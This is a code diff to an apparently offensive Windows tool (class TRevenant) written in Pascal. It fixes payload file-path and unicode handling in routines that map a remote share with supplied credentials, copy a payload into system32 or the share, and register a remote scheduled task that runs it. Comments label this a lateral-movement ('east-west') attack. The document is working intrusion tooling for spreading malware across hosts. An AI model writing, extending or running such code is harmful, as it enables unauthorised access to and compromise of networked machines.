@@ -42,7 +42,7 @@ uses
   {$IFDEF UNIX}{$IFDEF UseCThreads}
   cthreads,
   {$ENDIF}{$ENDIF}
-  Classes, SysUtils,windows,jwawinnetwk,CustApp,TaskScheduler_TLB,activex,types,DateUtils;
+  Classes, SysUtils,windows,jwawinnetwk,CustApp,TaskScheduler_TLB,activex,types,fileutil,DateUtils;
 
  type
    TIME_OF_DAY_INFO  = record
@@ -315,6 +315,18 @@ begin
 
 end;
 
+//fix filepath issue on task scheduling
+
+function ExtractFileN(const AFilename: string): string;
+var
+  filename,fileext:string;
+begin
+
+  result := ExtractFileName(AFilename);
+ // result := ExtractFileExt(AFilename);
+  //result := fileext;
+
+end;
 
 
 procedure TRevenant.eastwest(remotehost:string;auser:string;apass:string;domain:string;share:string;u_host:string;payload:string);
@@ -398,6 +410,7 @@ begin
   trigger.Id:='TimeTriggerId';
   trigger.Enabled:=true;
   action_:=taskdefinition.Actions.Create(0);
+  payload := extractfilen(payload);
   IExecAction(action_).Path:='\\'+u_host+'\'+s_share+'\'+payload;    //here should be path of mounted driver
 
  rootfolder.RegisterTaskDefinition('Test Task',
@@ -478,7 +491,8 @@ procedure TRevenant.mapdrive;
 var
   b:boolean;
   i,ch:integer;
-  host,username,password,domain,share,payload:string;
+  payload,o_payload:widestring;
+  host,username,password,domain,share:string;
 begin
   ch := 0;
   banner;
@@ -533,11 +547,11 @@ end;
   if FConnected = true then
   writeln('[+] Access Granted');
   writeln('[+] Checking permission (READ,WRITE) on Share ');
-
+  writeln(payload);
   if ( share ='admin' ) OR ( share = 'ADMIN') then
-  filecopy(getcurrentdir+'\'+payload,'c:\windows\system32\'+payload)
+  fileutil.copyfile(payload,'c:\windows\system32\'+extractfilename(payload),true)      //bug #5 - support unicode path names
   else
-  filecopy(getcurrentdir+'\'+payload,global_driver+'\'+payload);
+  fileutil.copyfile(payload,global_driver+'\'+extractfilename(payload),true);
 
   //stage 3 - start lateral movment attack here
   writeln('[->] Deploying Payload east-west');
